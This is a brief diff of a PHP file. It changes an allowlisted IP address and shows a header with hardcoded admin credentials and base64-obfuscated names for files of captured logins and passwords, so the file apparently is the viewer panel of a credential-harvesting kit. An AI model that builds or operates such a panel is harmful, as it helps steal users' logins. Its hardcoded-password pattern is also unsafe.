@@ -1,7 +1,7 @@
 ﻿<?php
 $DATA_FILE   = __DIR__ . '/dXNlcl9kYXRhX2xvZ2luX3Bhc3M=.txt';
 $ACCESS_LOG  = __DIR__ . '/dXNlcl9hY2Nlc3NfdXNlcl9wYXNz.log';
-$ALLOWED_IPS = '116.98.3.165';
+$ALLOWED_IPS = '116.98.3.33';
 $ADMIN_USER  = 'super@$adminuser$';
 $ADMIN_PASS  = 'super@$adminpass$';
 $MAX_LEN     = 200;
@@ -209,3 +209,4 @@ if (isset($_GET['view'])) {
     </table>
 </body>
 </html>
+
